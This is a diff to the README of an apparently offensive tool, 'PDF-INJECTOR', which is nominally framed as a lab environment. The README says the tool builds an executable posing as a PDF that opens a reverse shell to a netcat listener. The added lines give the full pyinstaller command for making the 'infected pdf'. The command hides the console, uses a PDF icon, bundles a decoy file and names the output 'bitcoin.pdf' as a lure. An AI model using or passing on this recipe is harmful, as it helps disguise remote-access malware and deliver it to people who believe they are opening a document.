@@ -8,6 +8,10 @@ This project is a laboratory environment for studying code persistence and execu
 
 The following libraries must be installed: socket, subprocess, os, sys, webbrowser, threading, time. Before using, you must have your PDF and PDF ICO files in the folder. Example files will already be in the repository. It is worth noting that pyinstaller must also be installed. The IP address must be changed in the pdf-injector.py code according to your IP address. After that, it will be necessary to use netcat to receive the connection.
 
+Command to create the infected pdf
+
+ pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf pdf-injector.py
+
 ### Demonstração do Payload
 ![Conexão da Reverse Shell](https://github.com/ronallldd/PDF-INJECTOR/raw/main/05.03.2026_21.00.22_REC.gif)
 
